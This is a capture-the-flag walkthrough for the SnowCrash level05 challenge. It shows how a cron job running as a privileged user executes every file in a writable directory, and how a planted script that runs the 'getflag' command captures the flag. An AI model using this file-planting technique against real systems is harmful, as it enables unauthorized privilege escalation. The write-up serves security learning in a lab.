# Walkthrough

When I accessed the level05 host, I noticed a message saying "You have new mail." I searched for the mail and found it contained the command
` "*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05"`, which appeared to be a crontab command. This command used the "su" command to run a shell script located at `/usr/sbin/openarenaserver` as the user "flag05".
```
level05@SnowCrash:/usr/sbin$ cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
level05@SnowCrash:/usr/sbin$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```
This script above would run every two minutes and executed all files in the /opt/openarenaserver directory with a CPU time limit of 5 seconds and with debugging information printed to the console, before removing each file.

Based on this information, I decided to create a script in the /opt/openarenaserver directory that would execute the "getflag" command and redirect its output to a file. This would allow me to potentially capture the flag and access the next level.
```
#!/bin/bash

getflag > /tmp/flag
```
